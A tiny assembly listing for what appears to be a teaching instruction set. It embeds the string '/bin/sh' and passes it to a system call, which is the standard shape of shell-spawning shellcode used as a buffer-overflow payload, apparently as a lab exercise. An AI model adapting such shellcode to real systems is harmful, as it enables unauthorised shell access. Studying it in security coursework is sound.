start:
gpc $2, r0
br execute
.long 0x2f62696e
.long 0x2f736800

execute:
ld $8, r1
sys $2
halt